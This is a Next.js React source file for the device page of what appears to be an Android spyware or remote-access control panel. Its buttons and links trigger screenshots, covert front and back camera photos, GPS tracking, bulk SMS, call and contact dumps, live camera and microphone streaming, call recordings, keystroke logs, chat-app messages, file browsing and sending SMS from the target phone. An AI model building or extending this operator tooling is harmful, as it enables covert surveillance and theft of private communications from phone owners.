'use client';

import { useEffect, useState, useCallback, Suspense } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import Sidebar from '@/components/layout/Sidebar';
import Header from '@/components/layout/Header';
import { connectSocket, pingDevice } from '@/lib/socket';
import { getDevice, dispatchCommand, getCommandHistory, getUnreadCounts } from '@/lib/api';
import { initializeLastViewed } from '@/lib/lastViewed';
import { useAuthStore, useDevicesStore } from '@/lib/store';
import { formatDistanceToNow, format } from 'date-fns';
import {
    Smartphone,
    MapPin,
    MessageSquare,
    Phone,
    Users,
    Keyboard,
    Bell,
    Image,
    Camera,
    Monitor,
    Send,
    RefreshCw,
    CheckCircle,
    Clock,
    XCircle,
    ChevronRight,
    ChevronDown,
    Video,
    Wifi,
    WifiOff,
    Zap,
    ArrowLeft,
    Mic,
    BarChart3,
    Settings,
    Terminal,
    Activity,
    Command,
    MessageCircle,
    Battery,
    BatteryCharging,
    Signal,
    FolderOpen,
} from 'lucide-react';
import Link from 'next/link';

const commandButtons = [
    { type: 'capture_screenshot', label: 'Screenshot', icon: Monitor, gradient: 'from-blue-500 to-cyan-400', category: 'capture' },
    { type: 'capture_photo', label: 'Front Camera', icon: Camera, gradient: 'from-purple-500 to-pink-400', payload: { camera: 'front' }, category: 'capture' },
    { type: 'capture_photo', label: 'Back Camera', icon: Camera, gradient: 'from-orange-500 to-amber-400', payload: { camera: 'back' }, category: 'capture' },
    { type: 'get_location', label: 'Get Location', icon: MapPin, gradient: 'from-emerald-500 to-teal-400', category: 'sync' },
    { type: 'dump_sms', label: 'Sync Latest SMS', icon: MessageSquare, gradient: 'from-pink-500 to-rose-400', payload: { days: 1 }, category: 'sync' },
    { type: 'dump_sms', label: 'Sync All SMS', icon: MessageSquare, gradient: 'from-pink-600 to-rose-500', category: 'sync', requiresConfirm: true },
    { type: 'dump_calls', label: 'Sync Latest Calls', icon: Phone, gradient: 'from-cyan-500 to-blue-400', payload: { days: 1 }, category: 'sync' },
    { type: 'dump_calls', label: 'Sync All Calls', icon: Phone, gradient: 'from-cyan-600 to-blue-500', category: 'sync', requiresConfirm: true },
    { type: 'dump_contacts', label: 'Sync Contacts', icon: Users, gradient: 'from-indigo-500 to-purple-400', category: 'sync' },
];

const dataLinks = [
    { href: 'stream', label: 'Live Stream', icon: Video, gradient: 'from-red-500 to-rose-400', description: 'Camera & mic feed', key: 'stream' },
    { href: 'recordings', label: 'Recordings', icon: Mic, gradient: 'from-amber-500 to-yellow-400', description: 'Call recordings', key: 'recordings' },
    { href: 'sms', label: 'Messages', icon: MessageSquare, gradient: 'from-blue-500 to-cyan-400', description: 'SMS history', key: 'sms' },
    { href: 'send-sms', label: 'Send SMS', icon: Send, gradient: 'from-green-500 to-emerald-400', description: 'Send messages', key: 'send-sms' },
    { href: 'calls', label: 'Call Logs', icon: Phone, gradient: 'from-emerald-500 to-teal-400', description: 'Call history', key: 'calls' },
    { href: 'contacts', label: 'Contacts', icon: Users, gradient: 'from-purple-500 to-pink-400', description: 'Contact list', key: 'contacts' },
    { href: 'keylogs', label: 'Keylogs', icon: Keyboard, gradient: 'from-orange-500 to-amber-400', description: 'Keystrokes', key: 'keylogs' },
    { href: 'notifications', label: 'Notifications', icon: Bell, gradient: 'from-pink-500 to-rose-400', description: 'App alerts', key: 'notifications' },
    { href: 'settings', label: 'Settings', icon: Settings, gradient: 'from-slate-600 to-zinc-500', description: 'Device config', key: 'settings' },
    { href: 'gallery', label: 'Gallery', icon: Image, gradient: 'from-cyan-500 to-blue-400', description: 'Photos & media', key: 'gallery' },
    { href: 'location', label: 'Location', icon: MapPin, gradient: 'from-yellow-500 to-orange-400', description: 'GPS history', key: 'locations' },
    { href: 'files', label: 'Files', icon: FolderOpen, gradient: 'from-indigo-500 to-purple-400', description: 'Browse device files', key: 'files' },
    { href: 'logs', label: 'App Logs', icon: Terminal, gradient: 'from-slate-500 to-gray-400', description: 'Debug logs', key: 'logs' },
    { href: '/messages', label: 'Chat Apps', icon: MessageCircle, gradient: 'from-green-500 to-emerald-400', description: 'WhatsApp & more', isExternal: true, key: 'chats' },
];

export default function DeviceDetailPage() {
    return (
        <Suspense fallback={
            <div className="min-h-screen flex items-center justify-center bg-[var(--bg-base)]">
                <div className="spinner w-12 h-12" />
            </div>
        }>
            <DeviceDetailContent />
        </Suspense>
    );
}

function DeviceDetailContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const deviceId = searchParams.get('id') as string;
    const { isAuthenticated, isHydrated } = useAuthStore();

    const [device, setDevice] = useState<any>(null);
    const [commands, setCommands] = useState<any[]>([]);
    const [loading, setLoading] = useState(true);
    const [commandLoading, setCommandLoading] = useState<string | null>(null);
    const [cooldown, setCooldown] = useState<number>(0);
    const [checkingStatus, setCheckingStatus] = useState(false);
    const [showStats, setShowStats] = useState(false);
    const [activeTab, setActiveTab] = useState<'commands' | 'data'>('commands');
    const { updateDevice } = useDevicesStore();

    // Confirmation modal state for heavy sync operations
    const [confirmModal, setConfirmModal] = useState<{ show: boolean; type: string; label: string; payload?: any; step: number } | null>(null);

    // Real-time device stats
    const [liveStats, setLiveStats] = useState<{
        batteryLevel?: number;
        isCharging?: boolean;
        networkType?: string;
        isRecording?: boolean;
        recordingNumber?: string;
    }>({});

    // Unread counts for showing badges on data tabs
    const [unreadCounts, setUnreadCounts] = useState<{
        recordings?: number;
        sms?: number;
        calls?: number;
        photos?: number;
        screenshots?: number;
        notifications?: number;
        keylogs?: number;
        locations?: number;
        gallery?: number;
    }>({});

    // Get last viewed timestamps from localStorage
    const getLastViewedTimestamps = useCallback(() => {
        if (typeof window === 'undefined') return {};
        const key = `lastViewed_${deviceId}`;
        try {
            const stored = localStorage.getItem(key);
            return stored ? JSON.parse(stored) : {};
        } catch {
            return {};
        }
    }, [deviceId]);

    // Fetch unread counts
    const fetchUnreadCounts = useCallback(async () => {
        if (!deviceId) return;
        try {
            const timestamps = getLastViewedTimestamps();
            // If no timestamps, don't fetch (first visit)
            if (Object.keys(timestamps).length === 0) return;

            const result = await getUnreadCounts(deviceId, timestamps);
            if (result.success) {
                setUnreadCounts(result.counts);
            }
        } catch (error) {
            console.error('Failed to fetch unread counts:', error);
        }
    }, [deviceId, getLastViewedTimestamps]);

    const handleCheckStatus = async () => {
        if (!device?.deviceId || checkingStatus) return;
        setCheckingStatus(true);

        try {
            // Send get_status command to device via socket
            // The device will respond with device:status event containing battery, network, etc.
            const socket = connectSocket();
            console.log('[RefreshStats] Sending get_status command for:', device.deviceId);
            console.log('[RefreshStats] Socket connected:', socket.connected);
            socket.emit('command:send', {
                deviceId: device.deviceId,
                type: 'get_status',
                payload: {}
            });
            console.log('[RefreshStats] Command sent!');

            // Note: We don't change online status here - that's determined by the 
            // device:online/device:offline events from the server
        } catch (error) {
            console.error('Status check failed:', error);
        } finally {
            // Keep spinner for 2s to show action was taken
            setTimeout(() => setCheckingStatus(false), 2000);
        }
    };

    // Accessibility permission state (for status display in header)
    const [accessibilityEnabled, setAccessibilityEnabled] = useState<boolean | null>(null);

    const fetchDevice = useCallback(async () => {
        try {
            setLoading(true);
            const [deviceData, commandsData] = await Promise.all([
                getDevice(deviceId),
                getCommandHistory(deviceId, 10),
            ]);

            if (deviceData.success) {
                setDevice(deviceData.device);
            }
            if (commandsData.success) {
                setCommands(commandsData.commands);
            }
        } catch (error) {
            console.error('Failed to fetch device:', error);
        } finally {
            setLoading(false);
        }
    }, [deviceId]);

    useEffect(() => {
        if (isHydrated && !isAuthenticated) {
            router.push('/login');
        }
    }, [isHydrated, isAuthenticated, router]);

    useEffect(() => {
        if (isAuthenticated && deviceId) {
            fetchDevice();

            // Initialize last viewed timestamps on first visit
            initializeLastViewed(deviceId);

            const socket = connectSocket();

            socket.on('device:online', (data: { deviceId: string }) => {
                if (data.deviceId === deviceId) {
                    setDevice((prev: any) => prev ? { ...prev, isOnline: true } : prev);
                }
            });

            socket.on('device:offline', (data: { deviceId: string }) => {
                if (data.deviceId === deviceId) {
                    setDevice((prev: any) => prev ? { ...prev, isOnline: false } : prev);
                }
            });

            // Listen for real-time device status (battery, network, etc.)
            socket.on('device:status', (data: {
                deviceId: string;
                batteryLevel?: number;
                networkType?: string;
                isCharging?: boolean
            }) => {
                console.log('[Socket] Received device:status:', data);
                console.log('[Socket] Current deviceId:', deviceId, 'Received:', data.deviceId);
                if (data.deviceId === deviceId) {
                    console.log('[Socket] Updating liveStats with:', data);
                    setLiveStats(prev => ({
                        ...prev,
                        batteryLevel: data.batteryLevel,
                        networkType: data.networkType,
                        isCharging: data.isCharging
                    }));
                }
            });

            // Listen for recording status
            socket.on('recording:status', (data: { deviceId: string; status: string; phoneNumber?: string }) => {
                if (data.deviceId === deviceId) {
                    setLiveStats(prev => ({
                        ...prev,
                        isRecording: data.status === 'recording',
                        recordingNumber: data.phoneNumber
                    }));
                }
            });

            // Listen for permission status updates
            socket.on('device:permissions', (data: { deviceId: string; permissions: any }) => {
                if (data.deviceId === deviceId && data.permissions) {
                    setAccessibilityEnabled(data.permissions.accessibility === true);
                }
            });

            return () => {
                socket.off('device:online');
                socket.off('device:offline');
                socket.off('device:status');
                socket.off('recording:status');
                socket.off('device:permissions');
            };
        }
    }, [isAuthenticated, deviceId, fetchDevice]);

    useEffect(() => {
        if (cooldown > 0) {
            const timer = setTimeout(() => setCooldown(prev => prev - 1), 1000);
            return () => clearTimeout(timer);
        }
    }, [cooldown]);

    // Fetch unread counts when page loads
    useEffect(() => {
        if (isAuthenticated && deviceId) {
            fetchUnreadCounts();
        }
    }, [isAuthenticated, deviceId, fetchUnreadCounts]);

    const handleCommand = async (type: string, payload?: any) => {
        if (cooldown > 0) return;

        setCommandLoading(type);
        try {
            const res = await dispatchCommand(deviceId, type, payload);
            if (res.success) {
                setCooldown(5);
                setTimeout(async () => {
                    const data = await getCommandHistory(deviceId, 10);
                    if (data.success) {
                        setCommands(data.commands);
                    }
                }, 500);
            }
        } catch (error: any) {
            console.error('Failed to dispatch command:', error);
            if (error.response?.data?.code === 'RATE_LIMIT') {
                setCooldown(5);
            }
        } finally {
            setCommandLoading(null);
        }
    };

    // Handle command with optional confirmation
    const handleCommandWithConfirmation = (cmd: typeof commandButtons[0]) => {
        if ((cmd as any).requiresConfirm) {
            setConfirmModal({ show: true, type: cmd.type, label: cmd.label, payload: cmd.payload, step: 1 });
        } else {
            handleCommand(cmd.type, cmd.payload);
        }
    };

    // Proceed with confirmed command
    const handleConfirmProceed = () => {
        if (!confirmModal) return;
        if (confirmModal.step === 1) {
            // First confirmation - ask again
            setConfirmModal({ ...confirmModal, step: 2 });
        } else {
            // Second confirmation - execute
            handleCommand(confirmModal.type, confirmModal.payload);
            setConfirmModal(null);
        }
    };

    if (!isHydrated || !isAuthenticated) return null;

    if (loading) {
        return (
            <div className="min-h-screen bg-[var(--bg-base)] pb-20 lg:pb-0">
                <Sidebar />
                <main className="lg:ml-72">
                    <Header title="Loading..." />
                    <div className="px-4 py-4 lg:px-8">
                        <div className="h-48 lg:h-64 rounded-2xl bg-[var(--bg-subtle)] skeleton" />
                    </div>
                </main>
            </div>
        );
    }

    if (!device) {
        return (
            <div className="min-h-screen bg-[var(--bg-base)] pb-20 lg:pb-0">
                <Sidebar />
                <main className="lg:ml-72">
                    <Header title="Device Not Found" />
                    <div className="px-4 py-4 lg:px-8">
                        <div className="bg-[var(--bg-elevated)] rounded-2xl p-8 text-center border border-[var(--border-light)]">
                            <Smartphone className="w-12 h-12 mx-auto mb-3 text-[var(--text-muted)]" />
                            <h3 className="font-bold text-lg mb-2">Device Not Found</h3>
                            <p className="text-sm text-[var(--text-muted)]">The requested device could not be found.</p>
                        </div>
                    </div>
                </main>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-[var(--bg-elevated)] lg:bg-[var(--bg-base)] pb-20 lg:pb-0">
            <Sidebar />
            <main className="lg:ml-72">
                <Header
                    title={device.model || 'Device'}
                    subtitle={device.isOnline ? 'Currently Online' : 'Offline'}
                    onRefresh={fetchDevice}
                    deviceId={device.deviceId}
                    deviceInfo={{
                        androidVersion: device.androidVersion,
                        model: device.model,
                    }}
                />

                <div className="lg:px-8 lg:max-w-7xl lg:mx-auto lg:space-y-6 lg:py-4">
                    {/* Back Button */}
                    <Link href="/" className="hidden lg:inline-flex items-center gap-2 text-[var(--text-muted)] hover:text-[var(--primary)] text-sm font-medium mb-4">
                        <ArrowLeft className="w-4 h-4" />
                        Back to Dashboard
                    </Link>

                    {/* Device Hero Card - Redesigned with Live Stats */}
                    <div className="bg-white lg:bg-[var(--bg-elevated)] mx-3 lg:mx-0 mt-4 lg:mt-0 rounded-2xl border border-[var(--border-light)] overflow-hidden shadow-lg">
                        {/* Gradient Header */}
                        <div className={`h-20 lg:h-28 relative ${device.isOnline
                            ? 'bg-gradient-to-r from-emerald-500 via-teal-500 to-cyan-500'
                            : 'bg-gradient-to-r from-slate-400 to-slate-500'
                            }`}>
                            <div className="absolute inset-0 opacity-20" style={{
                                backgroundImage: 'radial-gradient(circle at 25px 25px, rgba(255,255,255,0.15) 2px, transparent 0)'
                            }} />
                            <div className="absolute bottom-0 left-0 right-0 h-12 bg-gradient-to-t from-white lg:from-[var(--bg-elevated)] to-transparent" />
                        </div>

                        <div className="px-4 lg:px-6 pb-5 -mt-12 relative">
                            {/* Top Row: Icon + Name + Status */}
                            <div className="flex items-end gap-3 lg:gap-4">
                                {/* Device Icon */}
                                <div className={`w-16 h-16 lg:w-24 lg:h-24 rounded-2xl flex items-center justify-center border-4 border-white lg:border-[var(--bg-elevated)] shadow-xl ${device.isOnline
                                    ? 'bg-gradient-to-br from-emerald-400 to-teal-500'
                                    : 'bg-gradient-to-br from-slate-300 to-slate-400'
                                    }`}>
                                    <Smartphone className={`w-7 h-7 lg:w-12 lg:h-12 ${device.isOnline ? 'text-white' : 'text-white/80'}`} />
                                </div>

                                {/* Device Name + Status */}
                                <div className="flex-1 min-w-0">
                                    <h2 className="text-lg lg:text-2xl font-bold text-[var(--text-primary)] truncate">
                                        {device.model || 'Unknown Device'}
                                    </h2>
                                    <div className="flex items-center gap-2 mt-1 flex-wrap">
                                        <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-bold ${device.isOnline
                                            ? 'bg-emerald-500/15 text-emerald-600 border border-emerald-500/30'
                                            : 'bg-slate-500/15 text-slate-500 border border-slate-500/30'
                                            }`}>
                                            {device.isOnline ? <><span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" /> ONLINE</> : <><WifiOff className="w-3 h-3" /> Offline</>}
                                        </span>
                                        <span className="px-2.5 py-1 rounded-full bg-[var(--primary-glow)] text-[var(--primary)] font-bold text-xs border border-[var(--primary)]/20">
                                            Android {device.androidVersion}
                                        </span>
                                        <span className="text-xs text-[var(--text-muted)] hidden sm:inline">{device.manufacturer}</span>
                                    </div>
                                </div>
                            </div>

                            {/* Phone Stats Grid - Always Visible */}
                            <div className="mt-5 p-4 rounded-xl bg-gradient-to-br from-[var(--bg-subtle)] to-[var(--bg-base)] border border-[var(--border-light)]">
                                <div className="flex items-center justify-between mb-3">
                                    <h3 className="text-sm font-bold text-[var(--text-primary)] flex items-center gap-2">
                                        <Activity className="w-4 h-4 text-[var(--primary)]" />
                                        Phone Stats
                                    </h3>
                                    <button
                                        onClick={handleCheckStatus}
                                        disabled={checkingStatus || !device.isOnline}
                                        className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[var(--primary)] text-white text-xs font-semibold shadow-md hover:shadow-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                                    >
                                        <RefreshCw className={`w-3.5 h-3.5 ${checkingStatus ? 'animate-spin' : ''}`} />
                                        {checkingStatus ? 'Refreshing...' : 'Refresh Stats'}
                                    </button>
                                </div>

                                <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                                    {/* Battery */}
                                    <div className="flex items-center gap-3 p-3 rounded-xl bg-white lg:bg-[var(--bg-elevated)] border border-[var(--border-light)] shadow-sm">
                                        <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${liveStats.batteryLevel === undefined ? 'bg-slate-100' :
                                            liveStats.batteryLevel <= 20 ? 'bg-red-500/15' :
                                                liveStats.batteryLevel <= 50 ? 'bg-amber-500/15' : 'bg-emerald-500/15'
                                            }`}>
                                            {liveStats.isCharging ? (
                                                <BatteryCharging className={`w-5 h-5 ${liveStats.batteryLevel === undefined ? 'text-slate-400' :
                                                    liveStats.batteryLevel <= 20 ? 'text-red-500' :
                                                        liveStats.batteryLevel <= 50 ? 'text-amber-500' : 'text-emerald-500'
                                                    }`} />
                                            ) : (
                                                <Battery className={`w-5 h-5 ${liveStats.batteryLevel === undefined ? 'text-slate-400' :
                                                    liveStats.batteryLevel <= 20 ? 'text-red-500' :
                                                        liveStats.batteryLevel <= 50 ? 'text-amber-500' : 'text-emerald-500'
                                                    }`} />
                                            )}
                                        </div>
                                        <div>
                                            <p className="text-lg font-bold text-[var(--text-primary)]">
                                                {liveStats.batteryLevel !== undefined ? `${liveStats.batteryLevel}%` : '--'}
                                            </p>
                                            <p className="text-[10px] text-[var(--text-muted)] uppercase font-semibold">
                                                {liveStats.isCharging ? '⚡ Charging' : 'Battery'}
                                            </p>
                                        </div>
                                    </div>

                                    {/* Network */}
                                    <div className="flex items-center gap-3 p-3 rounded-xl bg-white lg:bg-[var(--bg-elevated)] border border-[var(--border-light)] shadow-sm">
                                        <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${liveStats.networkType ? 'bg-blue-500/15' : 'bg-slate-100'
                                            }`}>
                                            {liveStats.networkType?.toLowerCase().includes('wifi') ? (
                                                <Wifi className="w-5 h-5 text-blue-500" />
                                            ) : (
                                                <Signal className={`w-5 h-5 ${liveStats.networkType ? 'text-purple-500' : 'text-slate-400'}`} />
                                            )}
                                        </div>
                                        <div>
                                            <p className="text-lg font-bold text-[var(--text-primary)] uppercase">
                                                {liveStats.networkType || '--'}
                                            </p>
                                            <p className="text-[10px] text-[var(--text-muted)] uppercase font-semibold">Network</p>
                                        </div>
                                    </div>

                                    {/* Last Seen */}
                                    <div className="flex items-center gap-3 p-3 rounded-xl bg-white lg:bg-[var(--bg-elevated)] border border-[var(--border-light)] shadow-sm">
                                        <div className="w-10 h-10 rounded-xl bg-orange-500/15 flex items-center justify-center">
                                            <Clock className="w-5 h-5 text-orange-500" />
                                        </div>
                                        <div>
                                            <p className="text-sm font-bold text-[var(--text-primary)]">
                                                {formatDistanceToNow(new Date(device.lastSeen), { addSuffix: false })}
                                            </p>
                                            <p className="text-[10px] text-[var(--text-muted)] uppercase font-semibold">Last Seen</p>
                                        </div>
                                    </div>

                                    {/* Recording Status */}
                                    <div className="flex items-center gap-3 p-3 rounded-xl bg-white lg:bg-[var(--bg-elevated)] border border-[var(--border-light)] shadow-sm">
                                        <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${liveStats.isRecording ? 'bg-red-500/15' : 'bg-slate-100'
                                            }`}>
                                            <Mic className={`w-5 h-5 ${liveStats.isRecording ? 'text-red-500' : 'text-slate-400'}`} />
                                        </div>
                                        <div>
                                            <p className={`text-sm font-bold ${liveStats.isRecording ? 'text-red-500' : 'text-[var(--text-primary)]'}`}>
                                                {liveStats.isRecording ? 'Recording' : 'Idle'}
                                            </p>
                                            <p className="text-[10px] text-[var(--text-muted)] uppercase font-semibold">
                                                {liveStats.isRecording && liveStats.recordingNumber ? liveStats.recordingNumber : 'Call Rec'}
                                            </p>
                                        </div>
                                    </div>
                                </div>

                                {/* Cooldown Indicator */}
                                {cooldown > 0 && (
                                    <div className="mt-3 flex justify-center">
                                        <span className="text-xs text-[var(--primary)] bg-[var(--primary-glow)] px-3 py-1 rounded-full font-semibold">
                                            Command cooldown: {cooldown}s
                                        </span>
                                    </div>
                                )}
                            </div>

                            {/* Data Stats (if available) - Collapsible */}
                            {Object.keys(device.stats || {}).length > 0 && (
                                <div className="mt-4">
                                    <button
                                        onClick={() => setShowStats(!showStats)}
                                        className="w-full flex items-center justify-between p-3 rounded-xl bg-[var(--bg-subtle)] border border-[var(--border-light)] hover:bg-[var(--bg-base)] transition-colors"
                                    >
                                        <div className="flex items-center gap-2">
                                            <BarChart3 className="w-4 h-4 text-[var(--primary)]" />
                                            <span className="text-sm font-semibold text-[var(--text-primary)]">Data Statistics</span>
                                            <span className="text-xs text-[var(--text-muted)] bg-white lg:bg-[var(--bg-elevated)] px-2 py-0.5 rounded-full">
                                                {Object.keys(device.stats || {}).length} metrics
                                            </span>
                                        </div>
                                        <ChevronDown className={`w-4 h-4 text-[var(--text-muted)] transition-transform ${showStats ? 'rotate-180' : ''}`} />
                                    </button>

                                    {showStats && (
                                        <div className="grid grid-cols-3 sm:grid-cols-5 gap-2 mt-3 animate-fade-in">
                                            {Object.entries(device.stats || {}).map(([key, value]: [string, any]) => (
                                                <div key={key} className="text-center p-3 rounded-xl bg-white lg:bg-[var(--bg-elevated)] border border-[var(--border-light)] shadow-sm">
                                                    <div className="text-xl font-bold text-[var(--text-primary)]">{value}</div>
                                                    <div className="text-[10px] font-semibold text-[var(--text-muted)] capitalize">{key.replace(/([A-Z])/g, ' $1').trim()}</div>
                                                </div>
                                            ))}
                                        </div>
                                    )}
                                </div>
                            )}
                        </div>
                    </div>
                </div>
                {/* Main Content Grid */}
                <div className="p-3 lg:px-8 lg:max-w-7xl lg:mx-auto space-y-3 lg:space-y-6">
                    <div className="grid grid-cols-1 xl:grid-cols-3 gap-3 lg:gap-6">
                        {/* Left Column - Commands & Data */}
                        <div className="xl:col-span-2 space-y-3 lg:space-y-6">
                            {/* Tab Navigation */}
                            <div className="flex gap-2 p-1 rounded-xl bg-[var(--bg-subtle)] border border-[var(--border-light)]">
                                <button
                                    onClick={() => setActiveTab('commands')}
                                    className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg font-semibold text-sm transition-all ${activeTab === 'commands'
                                        ? 'bg-[var(--bg-elevated)] text-[var(--text-primary)] shadow-md'
                                        : 'text-[var(--text-muted)] hover:text-[var(--text-secondary)]'
                                        }`}
                                >
                                    <Command className="w-4 h-4" />
                                    Quick Commands
                                </button>
                                <button
                                    onClick={() => setActiveTab('data')}
                                    className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg font-semibold text-sm transition-all ${activeTab === 'data'
                                        ? 'bg-[var(--bg-elevated)] text-[var(--text-primary)] shadow-md'
                                        : 'text-[var(--text-muted)] hover:text-[var(--text-secondary)]'
                                        }`}
                                >
                                    <Image className="w-4 h-4" />
                                    Device Data
                                </button>
                            </div>

                            {/* Commands Tab */}
                            {activeTab === 'commands' && (
                                <div className="space-y-6 animate-fade-in">
                                    <div className="grid grid-cols-2 lg:grid-cols-3 gap-3">
                                        {commandButtons.map((cmd) => {
                                            const Icon = cmd.icon;
                                            const isLoading = commandLoading === cmd.type;
                                            const isDisabled = cooldown > 0 || !!commandLoading;
                                            const needsConfirm = (cmd as any).requiresConfirm;
                                            return (
                                                <button
                                                    key={`${cmd.type}-${cmd.label}`}
                                                    onClick={() => handleCommandWithConfirmation(cmd)}
                                                    disabled={isDisabled}
                                                    className={`card bg-[var(--bg-elevated)] p-4 flex flex-col items-center gap-3 text-center group relative ${isDisabled ? 'opacity-40 cursor-not-allowed' : 'hover:shadow-lg'}`}
                                                >
                                                    {needsConfirm && (
                                                        <span className="absolute top-2 right-2 text-[10px] bg-amber-500/20 text-amber-500 px-1.5 py-0.5 rounded font-bold">⚠️</span>
                                                    )}
                                                    <div className={`w-14 h-14 rounded-2xl bg-gradient-to-br ${cmd.gradient} flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform`}>
                                                        {isLoading ? (
                                                            <RefreshCw className="w-6 h-6 text-white animate-spin" />
                                                        ) : (
                                                            <Icon className="w-6 h-6 text-white" />
                                                        )}
                                                    </div>
                                                    <span className="font-semibold text-sm text-[var(--text-primary)]">{cmd.label}</span>
                                                </button>
                                            );
                                        })}
                                    </div>
                                </div>
                            )}

                            {/* Confirmation Modal */}
                            {confirmModal?.show && (
                                <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
                                    <div className="bg-[var(--bg-elevated)] rounded-2xl p-6 max-w-sm w-full border border-[var(--border-light)] shadow-2xl animate-fade-in">
                                        <div className="text-center mb-4">
                                            <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-amber-500/15 flex items-center justify-center">
                                                <span className="text-3xl">⚠️</span>
                                            </div>
                                            <h3 className="text-lg font-bold text-[var(--text-primary)] mb-2">
                                                {confirmModal.step === 1 ? 'Heavy Operation Warning' : 'Final Confirmation'}
                                            </h3>
                                            <p className="text-sm text-[var(--text-muted)]">
                                                {confirmModal.step === 1
                                                    ? `"${confirmModal.label}" will sync ALL historical data. This may take a very long time and use significant data.`
                                                    : `Are you absolutely sure? This action cannot be cancelled once started.`
                                                }
                                            </p>
                                        </div>
                                        <div className="flex gap-3">
                                            <button
                                                onClick={() => setConfirmModal(null)}
                                                className="flex-1 btn btn-secondary"
                                            >
                                                Cancel
                                            </button>
                                            <button
                                                onClick={handleConfirmProceed}
                                                className="flex-1 btn btn-danger"
                                            >
                                                {confirmModal.step === 1 ? 'Continue' : 'Yes, Sync All'}
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            )}

                            {/* Data Tab */}
                            {activeTab === 'data' && (
                                <div className="grid grid-cols-2 lg:grid-cols-3 gap-3 animate-fade-in">
                                    {dataLinks.map((link) => {
                                        const Icon = link.icon;
                                        // Handle external links (like /messages) differently
                                        const linkHref = (link as any).isExternal
                                            ? `${link.href}?deviceId=${deviceId}`
                                            : `/devices/view/${link.href}/?id=${deviceId}`;

                                        // Get unread count for this link
                                        const unreadCount = unreadCounts[link.key as keyof typeof unreadCounts] || 0;

                                        return (
                                            <Link key={link.href} href={linkHref}>
                                                <div className="card bg-[var(--bg-elevated)] p-4 flex flex-col items-center gap-3 text-center group hover:shadow-lg relative overflow-visible">
                                                    {/* Unread Badge */}
                                                    {unreadCount > 0 && (
                                                        <div className="absolute top-2 right-2 min-w-[22px] h-[22px] px-1.5 bg-red-500 rounded-full flex items-center justify-center shadow-lg z-10">
                                                            <span className="text-white text-xs font-bold">
                                                                {unreadCount > 99 ? '99+' : unreadCount}
                                                            </span>
                                                        </div>
                                                    )}
                                                    <div className={`w-14 h-14 rounded-2xl bg-gradient-to-br ${link.gradient} flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform`}>
                                                        <Icon className="w-6 h-6 text-white" />
                                                    </div>
                                                    <div>
                                                        <span className="font-semibold text-sm text-[var(--text-primary)] block">{link.label}</span>
                                                        <span className="text-xs text-[var(--text-muted)]">{link.description}</span>
                                                    </div>
                                                </div>
                                            </Link>
                                        );
                                    })}
                                </div>
                            )}

                            {/* Quick Settings Link */}
                            <Link
                                href={`/devices/view/settings/?id=${deviceId}`}
                                className="card bg-[var(--bg-elevated)] p-4 flex items-center gap-4 hover:shadow-lg group"
                            >
                                <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-slate-600 to-zinc-500 flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform">
                                    <Settings className="w-6 h-6 text-white" />
                                </div>
                                <div className="flex-1">
                                    <h3 className="font-bold text-[var(--text-primary)]">Device Settings</h3>
                                    <p className="text-sm text-[var(--text-muted)]">Configure security, recording, and accessibility</p>
                                </div>
                                <ChevronRight className="w-5 h-5 text-[var(--text-muted)] group-hover:text-[var(--primary)] transition-colors" />
                            </Link>
                        </div>

                        {/* Right Column - Activity Log */}
                        <div className="space-y-4">
                            <div className="flex items-center gap-3">
                                <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-slate-500 to-gray-600 flex items-center justify-center">
                                    <Activity className="w-5 h-5 text-white" />
                                </div>
                                <h3 className="font-bold text-[var(--text-primary)]">Activity Log</h3>
                            </div>
                            <div className="card bg-[var(--bg-elevated)] p-0 overflow-hidden">
                                {commands.length === 0 ? (
                                    <div className="empty-state py-8">
                                        <Zap className="w-8 h-8 text-[var(--text-muted)] mb-2" />
                                        <p className="text-sm font-medium text-[var(--text-muted)]">No recent activity</p>
                                    </div>
                                ) : (
                                    <div className="divide-y divide-[var(--border-light)]">
                                        {commands.map((cmd, i) => (
                                            <div key={cmd.id} className={`p-4 flex items-center justify-between hover:bg-[var(--bg-subtle)] transition-colors animate-fade-in stagger-${i + 1}`}>
                                                <div>
                                                    <p className="font-semibold text-sm text-[var(--text-primary)] capitalize">
                                                        {cmd.type.replace(/_/g, ' ')}
                                                    </p>
                                                    <p className="text-xs text-[var(--text-muted)] mt-0.5">
                                                        {format(new Date(cmd.createdAt), 'MMM d, HH:mm')}
                                                    </p>
                                                </div>
                                                <div className={`flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-semibold ${cmd.status === 'completed' ? 'bg-[var(--success-glow)] text-emerald-600' :
                                                    cmd.status === 'failed' ? 'bg-[var(--danger-glow)] text-red-600' :
                                                        'bg-[var(--info-glow)] text-blue-600'
                                                    }`}>
                                                    {cmd.status === 'completed' && <CheckCircle className="w-3 h-3" />}
                                                    {cmd.status === 'failed' && <XCircle className="w-3 h-3" />}
                                                    {(cmd.status === 'pending' || cmd.status === 'sent') && <RefreshCw className="w-3 h-3 animate-spin" />}
                                                    <span className="capitalize">{cmd.status}</span>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    );
}
